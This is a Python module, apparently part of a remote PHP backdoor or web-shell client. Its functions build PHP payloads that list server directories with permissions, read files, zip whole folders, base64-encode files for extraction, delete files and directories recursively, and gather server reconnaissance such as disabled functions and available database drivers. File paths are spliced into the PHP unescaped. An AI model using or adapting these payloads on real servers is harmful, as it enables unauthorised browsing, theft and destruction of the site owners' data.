#!/usr/bin/env python
# coding:utf-8
#   |                                                          |
# --+----------------------------------------------------------+--
#   |   Code by : yasserbdj96                                  |
#   |   Email   : yasser.bdj96@gmail.com                       |
#   |   Github  : https://github.com/yasserbdj96               |
#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
# --+----------------------------------------------------------+--  
#   |        all posts #yasserbdj96 ,all views my own.         |
# --+----------------------------------------------------------+--
#   |                                                          |

#START{
#
def scandir(dirx="./"):
    x="""
$path='"""+dirx+"""';
if(!is_dir($path)) {
    echo json_encode(["[✗] The Directory '{$path}' not exists"]);
    exit();
}

$fileList=array();
if($handle=opendir($path)){
    while(false!==($entry=readdir($handle))){
        if($entry!="." && $entry!=".."){
            if(is_dir($entry)){
                $entry=$path.$entry."/";
            }else{
                $entry=$path.$entry;
            }
            $fileList[]=$entry;
        }
    }
    closedir($handle);
}
echo json_encode($fileList);"""
    return x
#
def scandir_all(dirx="./"):
    x="""
function getDirContents($dir="./",$relativePath=false){

    if(!is_dir($dir)) {
        return ["[✗] The Directory '{$dir}' not exists"];
    }

    $fileList=array();
    $iterator=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    foreach($iterator as $file){
        if ($file->isDir()) continue;
        $path=$file->getPathname();
        if ($relativePath) {
            $path=str_replace($dir,'',$path);
            $path=ltrim($path, '/');
        }

        $perms = fileperms($path);

        switch ($perms & 0xF000) {
            case 0xC000: // socket
                $info = 's';
                break;
            case 0xA000: // symbolic link
                $info = 'l';
                break;
            case 0x8000: // regular
                $info = 'r';
                break;
            case 0x6000: // block special
                $info = 'b';
                break;
            case 0x4000: // directory
                $info = 'd';
                break;
            case 0x2000: // character special
                $info = 'c';
                break;
            case 0x1000: // FIFO pipe
                $info = 'p';
                break;
            default: // unknown
                $info = 'u';
        }

        // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
                    (($perms & 0x0800) ? 's' : 'x' ) :
                    (($perms & 0x0800) ? 'S' : '-'));

        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
                    (($perms & 0x0400) ? 's' : 'x' ) :
                    (($perms & 0x0400) ? 'S' : '-'));

        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
                    (($perms & 0x0200) ? 't' : 'x' ) :
                    (($perms & 0x0200) ? 'T' : '-'));

        $file_stats = stat($path);

        //
        $last_use=date('M d H:m',$file_stats["mtime"]);

        //
        $bytes=filesize($path);
        if ($bytes >= 1073741824){
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }elseif ($bytes >= 1048576){
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }elseif ($bytes >= 1024){
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        }elseif ($bytes > 1){
            $bytes = $bytes . ' bytes';
        }elseif ($bytes == 1){
                $bytes = $bytes . ' byte';
        }else{
            $bytes = '0 bytes';
        }

        if(strlen($bytes)<11){
            $s=11-strlen($bytes);
            $bytes=str_repeat(" ",$s).$bytes;
        }

        //
        $fileList[]=$info." ".$last_use." ".$bytes." ".$path;
    }
    return $fileList;
}
echo json_encode(getDirContents('"""+dirx+"""'));"""
    return x
#
def file_get_contents(dirx):
    return f"""echo file_get_contents('{dirx}');"""

#
def zip_path(path="./"):
    php_zip_code="""// Get real path for our folder
$rootPath = realpath('"""+path+"""');

$path_name=str_replace(DIRECTORY_SEPARATOR, '_', '"""+path+"""');

$hash=$path_name."_".date("ymdHis");

// Initialize archive object
$zip = new ZipArchive();
$zip->open($hash.'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);

// Create recursive directory iterator
/** @var SplFileInfo[] $files */
$files = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($rootPath),
    RecursiveIteratorIterator::LEAVES_ONLY
);

foreach ($files as $name => $file)
{
    // Skip directories (they would be added automatically)
    if (!$file->isDir())
    {
        // Get real and relative path for current file
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($rootPath) + 1);

        // Add current file to archive
        $zip->addFile($filePath, $relativePath);
    }
}

// Zip archive will be created only after closing object
$zip->close();
echo $hash.".zip";"""
    return php_zip_code

#
def file_to_b64(path):
    code="""
$file='"""+path+"""';
$fp=fopen($file, "rb");
$binary=fread($fp,filesize($file));
echo base64_encode($binary);"""
    return code

#
def DIRECTORY_SEPARATOR():
    code="echo DIRECTORY_SEPARATOR;"
    return code

#
def rm(t,path):
    code1="""
$filename = '"""+path+"""';
if (unlink($filename)){
	echo 'The file "'.$filename.'" was deleted successfully!';
} else {
	echo 'There was a error deleting the file "'.$filename.'"';
}"""
    code2="""
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    if (rmdir($dir)){
        echo 'The Directory "'.$dir.'" was deleted successfully!';
    }else{
        echo 'There was a error deleting the Directory "'.$dir.'"';
    }
}
deleteDirectory('"""+path+"""');
"""
    if t=="-f":
        return code1
    elif t=="-d":
        return code2


#
def php_info():
    code="""header('Content-type: text/plain');
    echo "OS : ".php_uname();
    echo "\n";
    echo "your_ip: ".$_SERVER['REMOTE_ADDR'];
    echo "\n";
    echo "HTTP_HOST : ".$_SERVER['HTTP_HOST'];
    echo "\n";
    echo "REQUEST_METHOD : ".$_SERVER['REQUEST_METHOD'];
    echo "\n";
    echo "SERVER_ADMIN : ".$_SERVER['SERVER_ADMIN'];
    echo "\n";
    echo "SERVER_PORT : ".htmlentities($_SERVER['SERVER_PORT'], ENT_QUOTES, 'UTF-8');
    echo "\n";
    echo "server_ip : ".gethostbyname($_SERVER["HTTP_HOST"]);
    echo "\n";
    echo "PHP_SELF : ".$_SERVER['PHP_SELF'];
    echo "\n";
    echo "GATEWAY_INTERFACE : ".$_SERVER['GATEWAY_INTERFACE'];
    echo "\n";
    echo "SERVER_ADDR : ".$_SERVER['SERVER_ADDR'];
    echo "\n";
    echo "SERVER_NAME : ".$_SERVER['SERVER_NAME'];
    echo "\n";
    echo "SERVER_PROTOCOL : ".$_SERVER['SERVER_PROTOCOL'];
    echo "\n";
    echo "REQUEST_TIME : ".$_SERVER['REQUEST_TIME'];
    echo "\n";
    echo "QUERY_STRING : ".$_SERVER['QUERY_STRING'];
    echo "\n";
    echo "HTTP_ACCEPT : ".$_SERVER['HTTP_ACCEPT'];
    echo "\n";
    echo "HTTP_ACCEPT_CHARSET : ".$_SERVER['HTTP_ACCEPT_CHARSET'];
    echo "\n";
    echo "HTTP_REFERER : ".$_SERVER['HTTP_REFERER'];
    echo "\n";
    echo "HTTPS : ".$_SERVER['HTTPS'];
    echo "\n";
    echo "REMOTE_HOST : ".$_SERVER['REMOTE_HOST'];
    echo "\n";
    echo "REMOTE_PORT : ".$_SERVER['REMOTE_PORT'];
    echo "\n";
    echo "SCRIPT_FILENAME : ".$_SERVER['SCRIPT_FILENAME'];
    echo "\n";
    echo "SERVER_SIGNATURE : ".$_SERVER['SERVER_SIGNATURE'];
    echo "\n";
    echo "PATH_TRANSLATED : ".$_SERVER['PATH_TRANSLATED'];
    echo "\n";
    echo "SCRIPT_NAME : ".$_SERVER['SCRIPT_NAME'];
    echo "\n";
    echo "SCRIPT_URI : ".$_SERVER['SCRIPT_URI'];
    echo "\n";
    echo "server_software : ".getenv("SERVER_SOFTWARE");
    echo "\n";
    echo "Php Version : ".phpversion();
    echo "\n";
    echo "Zend : ".htmlentities(zend_version(), ENT_QUOTES, 'UTF-8');
    echo "\n";
    echo "Oracle : ".$Oracle2=function_exists('ocilogon')?("ON"):("OFF");   
    echo "\n";
    echo "MySQL : ".$MySQL2=function_exists('mysql_connect')?("ON"):("OFF");
    echo "\n";
    echo "MSSQL : ".$MSSQL2=function_exists('mssql_connect')?("ON"):("OFF");
    echo "\n";
    echo "PostgreSQL : ".$pg_connect2=function_exists('pg_connect')?("ON"):("OFF");
    echo "\n";
    echo "disabled_functions : ".$r=ini_get('disable_functions') ? ini_get('disable_functions'):'none';
    echo "\n";
    echo "DIRECTORY_SEPARATOR : ".DIRECTORY_SEPARATOR;"""
    return code
#}END.
